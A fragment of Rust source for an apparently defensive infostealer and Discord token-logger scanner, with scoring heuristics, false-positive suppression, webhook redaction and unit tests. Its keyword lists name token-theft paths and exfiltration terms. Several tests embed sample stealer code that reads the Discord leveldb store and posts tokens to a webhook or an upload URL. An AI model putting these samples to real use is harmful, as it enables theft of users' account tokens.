                "discorddevelopment",
                "authorization",
                "local storage",
                "leveldb",
                "token_regex",
                "token grabber",
            ],
        )
    })
}

fn has_discord_token_harvesting_context(lower: &str) -> bool {
    contains_any(
        lower,
        &[
            "discord\\\\local storage\\\\leveldb",
            "discord/local storage/leveldb",
            "discordcanary\\\\local storage\\\\leveldb",
            "discordcanary/local storage/leveldb",
            "discordptb\\\\local storage\\\\leveldb",
            "discordptb/local storage/leveldb",
            "discorddevelopment\\\\local storage\\\\leveldb",
            "discorddevelopment/local storage/leveldb",
            "discord\\\\local state",
            "discord/local state",
            "discord_desktop_core",
            "token grabber",
            "token_regex",
        ],
    ) || (lower.contains("leveldb") && lower.contains("discord") && lower.contains("token"))
        || (lower.contains("discord token")
            && contains_any(
                lower,
                &[
                    "local storage",
                    "leveldb",
                    "grab",
                    "regex",
                    "webhook",
                    "requests.post",
                    "senddocument",
                    "upload",
                    "exfil",
                    "encrypted_key",
                    "os_crypt",
                ],
            ))
}

fn has_remediation_context(lower: &str) -> bool {
    let cleanup_markers = count_indicator_matches(
        lower,
        &[
            "removal tool",
            "remover",
            "cleanup",
            "clean up",
            "clean_registry",
            "clean temp",
            "quarantine",
            "delete detected",
            "delete malicious",
            "remove_scheduled_task",
            "removed scheduled task",
            "remove_persistence",
            "removed registry value",
            "remove_defender_exclusion",
            "removemp",
            "remove-mppreference -exclusionpath",
            "winreg.deletevalue",
            "os.remove(",
            "shutil.rmtree",
            "known_malicious_hashes",
            "known malicious hashes",
            "infected mods detected",
            "no malicious registry entries found",
            "no suspicious temp files found",
        ],
    );
    let confirmation_or_recovery = contains_any(
        lower,
        &[
            "type 'kill'",
            "type \"kill\"",
            "type 'delete'",
            "type \"delete\"",
            "type 'invalidate'",
            "type \"invalidate\"",
            "user confirmation",
            "skipped",
            "scan complete",
            "change your password",
            "invalidate",
            "invalidates any stolen",
            "stolen session tokens",
            "malware may still be running",
        ],
    );

    cleanup_markers >= 3 && confirmation_or_recovery
}

fn has_benign_terminal_context(lower: &str) -> bool {
    contains_any(
        lower,
        &[
            "mintty '",
            "mintty.exe",
            "mintty screen dump",
            "mintty.github.io",
            "raw.githubusercontent.com/mintty/mintty/master/version",
            "/usr/share/mintty",
            ".minttyrc",
        ],
    ) && count_indicator_matches(
        lower,
        &[
            "mintty",
            "msys-2.0.dll",
            "terminal",
            "vt220 keyboard",
            "xterm",
            "mintty_",
            "term_program",
            "chere_invoking",
            "minttyrc",
            "mintty screen dump",
            "checkversionupdate",
        ],
    ) >= 4
}

fn count_indicator_matches(value: &str, needles: &[&str]) -> usize {
    needles
        .iter()
        .filter(|needle| value.contains(**needle))
        .count()
}

fn context_window(value: &str, start: usize, end: usize, radius: usize) -> &str {
    let mut left = start.saturating_sub(radius);
    while left > 0 && !value.is_char_boundary(left) {
        left -= 1;
    }

    let mut right = end.saturating_add(radius).min(value.len());
    while right < value.len() && !value.is_char_boundary(right) {
        right += 1;
    }

    &value[left..right]
}

fn contains_any(value: &str, needles: &[&str]) -> bool {
    needles.iter().any(|needle| value.contains(needle))
}

fn add_threat(threat: &mut ThreatAssessment, score: u32, reason: &str, categories: u32) {
    threat.categories |= categories;
    if !threat.reasons.iter().any(|existing| existing == reason) {
        threat.score = threat.score.saturating_add(score);
        threat.reasons.push(reason.to_string());
    }
}

fn threat_output(path: String, source: &str, threat: ThreatAssessment) -> Option<ThreatOutput> {
    if threat.score == 0 {
        return None;
    }

    let has_webhook = has_category(&threat, CAT_WEBHOOK);
    let has_exfil = has_category(&threat, CAT_EXFIL);
    let has_obfuscation = has_category(&threat, CAT_OBFUSCATION);
    let av_detected = has_category(&threat, CAT_AV_DETECTED);
    let has_staging = has_category(&threat, CAT_STAGING);
    let has_family = has_category(&threat, CAT_STEALER_FAMILY);
    let has_persistence = has_category(&threat, CAT_PERSISTENCE);
    let has_anti_analysis = has_category(&threat, CAT_ANTI_ANALYSIS);
    let has_remediation = has_category(&threat, CAT_REMEDIATION);
    let has_benign_terminal = has_category(&threat, CAT_BENIGN_TERMINAL);
    let has_high_risk_collection_or_secret = has_webhook
        || has_exfil
        || has_category(&threat, CAT_BROWSER_STORE)
        || has_category(&threat, CAT_DECRYPT)
        || has_category(&threat, CAT_WALLET)
        || has_category(&threat, CAT_MESSAGING)
        || has_category(&threat, CAT_PASSWORD_MANAGER)
        || has_category(&threat, CAT_FTP_MAIL_VPN)
        || has_category(&threat, CAT_PAYMENT_AUTOFILL)
        || has_category(&threat, CAT_KEY_MATERIAL)
        || has_category(&threat, CAT_INPUT_CAPTURE);
    let target_categories = category_count(
        &threat,
        &[
            CAT_BROWSER_STORE,
            CAT_DECRYPT,
            CAT_DISCORD_TOKEN,
            CAT_WALLET,
            CAT_MESSAGING,
            CAT_PASSWORD_MANAGER,
            CAT_FTP_MAIL_VPN,
            CAT_PAYMENT_AUTOFILL,
            CAT_KEY_MATERIAL,
            CAT_INPUT_CAPTURE,
        ],
    );
    let support_categories = usize::from(has_obfuscation)
        + usize::from(has_staging)
        + usize::from(has_family)
        + usize::from(has_persistence)
        + usize::from(has_anti_analysis)
        + usize::from(has_category(&threat, CAT_RECON));

    if has_remediation
        && !av_detected
        && !has_high_risk_collection_or_secret
        && target_categories <= 1
        && support_categories <= 3
        && threat.score < 90
    {
        return None;
    }

    let credential_or_stealer_targets = category_count(
        &threat,
        &[
            CAT_BROWSER_STORE,
            CAT_DECRYPT,
            CAT_DISCORD_TOKEN,
            CAT_WALLET,
            CAT_MESSAGING,
            CAT_PASSWORD_MANAGER,
            CAT_FTP_MAIL_VPN,
            CAT_PAYMENT_AUTOFILL,
        ],
    );
    if has_benign_terminal
        && !av_detected
        && !has_webhook
        && credential_or_stealer_targets == 0
        && !has_family
        && !has_staging
        && threat.score < 120
    {
        return None;
    }

    let likely = (av_detected && threat.score >= 80)
        || (has_webhook && target_categories >= 1 && threat.score >= 60)
        || (has_exfil && target_categories >= 2 && threat.score >= 82)
        || (target_categories >= 3 && support_categories >= 1 && threat.score >= 82)
        || (has_family && target_categories >= 2 && threat.score >= 76)
        || (has_staging && target_categories >= 2 && has_exfil && threat.score >= 82);
    let suspicious = av_detected
        || (has_webhook && threat.score >= 35)
        || (has_exfil && target_categories >= 1 && threat.score >= 52)
        || (target_categories >= 2 && support_categories >= 1 && threat.score >= 60)
        || (has_family && target_categories >= 1 && threat.score >= 50)
        || (has_staging && target_categories >= 1 && threat.score >= 48);

    let label = if likely {
        "Infostealer-likely"
    } else if suspicious {
        "Suspicious-stealer-pattern"
    } else {
        return None;
    };

    let has_discord_token = has_category(&threat, CAT_DISCORD_TOKEN);
    let has_browser_store = has_category(&threat, CAT_BROWSER_STORE);
    let has_decrypt = has_category(&threat, CAT_DECRYPT);
    let mut reasons = threat.reasons;
    if has_discord_token
        && (has_exfil || has_webhook || has_browser_store || has_decrypt)
        && !reasons
            .iter()
            .any(|reason| reason == "Likely Discord token logger behavior")
    {
        reasons.push("Likely Discord token logger behavior".to_string());
    }

    Some(ThreatOutput {
        path,
        source: source.to_string(),
        label: label.to_string(),
        score: threat.score,
        reasons,
    })
}

fn has_category(threat: &ThreatAssessment, category: u32) -> bool {
    (threat.categories & category) != 0
}

fn category_count(threat: &ThreatAssessment, categories: &[u32]) -> usize {
    categories
        .iter()
        .filter(|category| has_category(threat, **category))
        .count()
}

fn dedupe_candidates(candidates: &mut Vec<Candidate>) {
    let mut seen = HashSet::new();
    candidates.retain(|candidate| seen.insert(candidate.value.to_ascii_lowercase()));
}

fn is_output_file(path: &Path, output: &Path) -> bool {
    if path.file_name() != output.file_name() {
        return false;
    }

    match (fs::canonicalize(path), fs::canonicalize(output)) {
        (Ok(left), Ok(right)) => left == right,
        _ => path == output,
    }
}

fn is_expected_locked_error(error: Option<&io::Error>) -> bool {
    matches!(
        error.and_then(|value| value.raw_os_error()),
        Some(5 | 32 | 33)
    )
}

fn write_candidates(
    path: &Path,
    candidates: Vec<Candidate>,
    threat: Option<&ThreatOutput>,
    stats: &Stats,
    event_tx: &Sender<Event>,
    findings_writer: &Arc<Mutex<BufWriter<File>>>,
    reveal_secrets: bool,
    emit_secrets_to_ui: bool,
) {
    for candidate in candidates {
        let finding = to_finding(
            &path.display().to_string(),
            "file",
            &candidate,
            reveal_secrets,
            emit_secrets_to_ui,
            threat,
        );
        stats.findings.fetch_add(1, Ordering::Relaxed);

        {
            let mut writer = findings_writer.lock().expect("findings lock");
            let _ = writeln!(writer, "[{}] {}", finding.confidence, finding.path);
            let _ = writeln!(writer, "  source: {}", finding.source);
            let _ = writeln!(writer, "  method: {}", finding.method);
            let _ = writeln!(writer, "  evidence: {}", finding.evidence);
            if let Some(label) = &finding.threat_label {
                let _ = writeln!(writer, "  threat: {} ({})", label, finding.threat_score);
                let _ = writeln!(writer, "  reasons: {}", finding.threat_reasons.join("; "));
            }
            let _ = writeln!(writer, "  sha256: {}", finding.sha256);
            let _ = writeln!(writer);
        }

        let _ = event_tx.send(Event::Finding { finding });
    }
}

fn write_candidates_for_location(
    location: &str,
    source: &str,
    candidates: Vec<Candidate>,
    threat: Option<&ThreatOutput>,
    stats: &Stats,
    event_tx: &Sender<Event>,
    findings_writer: &Arc<Mutex<BufWriter<File>>>,
    reveal_secrets: bool,
    emit_secrets_to_ui: bool,
) {
    for candidate in candidates {
        let finding = to_finding(
            location,
            source,
            &candidate,
            reveal_secrets,
            emit_secrets_to_ui,
            threat,
        );
        stats.findings.fetch_add(1, Ordering::Relaxed);

        {
            let mut writer = findings_writer.lock().expect("findings lock");
            let _ = writeln!(writer, "[{}] {}", finding.confidence, finding.path);
            let _ = writeln!(writer, "  source: {}", finding.source);
            let _ = writeln!(writer, "  method: {}", finding.method);
            let _ = writeln!(writer, "  evidence: {}", finding.evidence);
            if let Some(label) = &finding.threat_label {
                let _ = writeln!(writer, "  threat: {} ({})", label, finding.threat_score);
                let _ = writeln!(writer, "  reasons: {}", finding.threat_reasons.join("; "));
            }
            let _ = writeln!(writer, "  sha256: {}", finding.sha256);
            let _ = writeln!(writer);
        }

        let _ = event_tx.send(Event::Finding { finding });
    }
}

fn to_finding(
    location: &str,
    source: &str,
    candidate: &Candidate,
    reveal_secrets: bool,
    emit_secrets_to_ui: bool,
    threat: Option<&ThreatOutput>,
) -> FindingOutput {
    let sha256 = sha256_hex(&candidate.value);
    let evidence = if reveal_secrets {
        candidate.value.clone()
    } else {
        redact_webhook(&candidate.value)
    };

    FindingOutput {
        path: location.to_string(),
        confidence: candidate.confidence.to_string(),
        method: candidate.method.clone(),
        evidence,
        sha256,
        secret: emit_secrets_to_ui.then(|| candidate.value.clone()),
        source: source.to_string(),
        threat_label: threat.map(|value| value.label.clone()),
        threat_score: threat.map(|value| value.score).unwrap_or_default(),
        threat_reasons: threat
            .map(|value| value.reasons.clone())
            .unwrap_or_default(),
    }
}

fn sha256_hex(value: &str) -> String {
    let digest = Sha256::digest(value.as_bytes());
    format!("{digest:x}")
}

fn redact_webhook(value: &str) -> String {
    let lower = value.to_ascii_lowercase();
    let Some(marker) = lower.find("/webhooks/") else {
        return value.to_string();
    };

    let after_marker = marker + "/webhooks/".len();
    let after = &value[after_marker..];
    let mut parts = after.splitn(3, '/');
    let Some(id) = parts.next() else {
        return value.to_string();
    };
    let Some(token) = parts.next() else {
        return value.to_string();
    };

    let token_start = after_marker + id.len() + 1;
    let token_end = token_start + token.len();
    let suffix = &value[token_end..];
    format!("{}{}{}", &value[..token_start], mask_token(token), suffix)
}

fn mask_token(token: &str) -> String {
    if token.len() <= 12 {
        "<redacted>".to_string()
    } else {
        let prefix = &token[..token.len().min(4)];
        let suffix_start = token.len().saturating_sub(6);
        let suffix = &token[suffix_start..];
        format!("{prefix}...{suffix}")
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn classify_text(text: &str) -> Option<ThreatOutput> {
        let mut threat = ThreatAssessment::default();
        score_threat_text(text, &mut threat);
        threat_output("sample.py".to_string(), "file", threat)
    }

    #[test]
    fn remediation_cleanup_language_does_not_emit_weak_stealer_hit() {
        let text = r#"
            # Weedhack removal tool
            KNOWN_MALICIOUS_HASHES = {"abc"}
            def remove_scheduled_task():
                subprocess.run(["schtasks", "/Delete", "/TN", "JavaSecurityUpdater", "/F"])
            def remove_defender_exclusion():
                cmd = "Remove-MpPreference -ExclusionPath 'C:\\Users'"
            def clean_registry():
                winreg.DeleteValue(key, name)
            print("This invalidates any stolen session tokens")
            print("This resets your Discord token")
            confirm = input("Type 'DELETE' to delete detected malicious files")
            decoded = base64.b64decode(sample)
        "#;

        assert!(classify_text(text).is_none());
    }

    #[test]
    fn discord_token_regex_requires_nearby_token_context() {
        let token_like = "aaaaaaaaaaaaaaaaaaaaaaaa.bbbbbb.cccccccccccccccccccccccccccccccc";
        let far_context = format!(
            "discord token reset guidance {} {}",
            "x".repeat(900),
            token_like
        );

        assert!(!has_discord_token_with_context(&far_context));
    }

    #[test]
    fn webhook_and_discord_leveldb_harvesting_still_emit() {
        let text = r#"
            import requests
            token_regex = r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}"
            path = os.getenv("APPDATA") + "\\Discord\\Local Storage\\leveldb"
            requests.post(
                "https://discord.com/api/webhooks/123456789012345678/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
                json={"content": token_regex},
            )
        "#;

        let finding = classify_text(text).expect("malicious webhook/token harvesting should emit");
        assert_eq!(finding.label, "Infostealer-likely");
        assert!(
            finding
                .reasons
                .iter()
                .any(|reason| reason.contains("Webhook"))
        );
    }

    #[test]
    fn mintty_terminal_context_does_not_emit_generic_keylogger_hit() {
        let mut threat = ThreatAssessment::default();
        let text = br#"
            mintty '3.7.6' 2024-09-24_05:10 (x86_64-pc-msys)
            msys-2.0.dll terminal vt220 keyboard xterm MINTTY_PWD CHERE_INVOKING
            /usr/share/mintty .minttyrc mintty screen dump CheckVersionUpdate
            URLDownloadToFileA urlmon.dll https://raw.githubusercontent.com/mintty/mintty/master/VERSION
            SetWindowsHookExW GetKeyboardState GetProcAddress LoadLibraryA WNetOpenEnumA
        "#;
        score_compiled_binary_window(Path::new("mintty.exe"), text, &mut threat);
        score_threat_text(&String::from_utf8_lossy(text), &mut threat);

        assert!(threat_output("mintty.exe".to_string(), "file", threat).is_none());
    }

    #[test]
    fn terminal_context_with_webhook_still_emits() {
        let mut threat = ThreatAssessment::default();
        let text = br#"
            mintty '3.7.6' terminal vt220 keyboard xterm MINTTY_PWD CHERE_INVOKING
            /usr/share/mintty .minttyrc CheckVersionUpdate
            URLDownloadToFileA SetWindowsHookExW
            https://discord.com/api/webhooks/123456789012345678/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
        "#;
        score_compiled_binary_window(Path::new("mintty.exe"), text, &mut threat);
        score_threat_text(&String::from_utf8_lossy(text), &mut threat);

        assert!(threat_output("mintty.exe".to_string(), "file", threat).is_some());
    }

    #[test]
    fn scan_file_does_not_return_standalone_threat_without_webhook() {
        let dir = env::temp_dir().join(format!("weehok-test-{}", std::process::id()));
        fs::create_dir_all(&dir).expect("create temp dir");
        let path = dir.join("token_context_without_webhook.py");
        fs::write(
            &path,
            r#"
                import requests
                path = "%APPDATA%\\Discord\\Local Storage\\leveldb"
                token_regex = r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}"
                requests.post("https://example.invalid/upload", json={"token": token_regex})
            "#,
        )
        .expect("write sample");
        let len = fs::metadata(&path).expect("metadata").len();
        let config = Config {
            roots: vec![path.clone()],
            output: dir.join("findings.txt"),
            threads: 1,
            max_file_bytes: None,
            reveal_secrets: false,
            emit_secrets_to_ui: false,
            scan_memory: false,
            scan_network: false,
        };

        let (_, candidates, _, threat) = scan_file(
            &FileJob {
                path: path.clone(),
                len,
            },
            &config,
        )
        .expect("scan file");
        let _ = fs::remove_file(&path);
        let _ = fs::remove_dir_all(&dir);

        assert!(candidates.is_empty());
        assert!(threat.is_none());
    }

    #[test]
    fn scan_file_keeps_threat_context_when_webhook_is_found() {
        let dir = env::temp_dir().join(format!("weehok-test-webhook-{}", std::process::id()));
        fs::create_dir_all(&dir).expect("create temp dir");
        let path = dir.join("webhook_token_context.py");
        fs::write(
            &path,
            r#"
                import requests
                path = "%APPDATA%\\Discord\\Local Storage\\leveldb"
                token_regex = r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}"
                requests.post("https://discord.com/api/webhooks/123456789012345678/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", json={"token": token_regex})
            "#,
        )
        .expect("write sample");
        let len = fs::metadata(&path).expect("metadata").len();
        let config = Config {
            roots: vec![path.clone()],
            output: dir.join("findings.txt"),
            threads: 1,
            max_file_bytes: None,
            reveal_secrets: false,
            emit_secrets_to_ui: false,
            scan_memory: false,
            scan_network: false,
        };

        let (_, candidates, _, threat) = scan_file(
            &FileJob {
                path: path.clone(),
                len,
            },
            &config,
        )
        .expect("scan file");
        let _ = fs::remove_file(&path);
        let _ = fs::remove_dir_all(&dir);

        assert!(!candidates.is_empty());
        assert!(threat.is_some());
    }
}
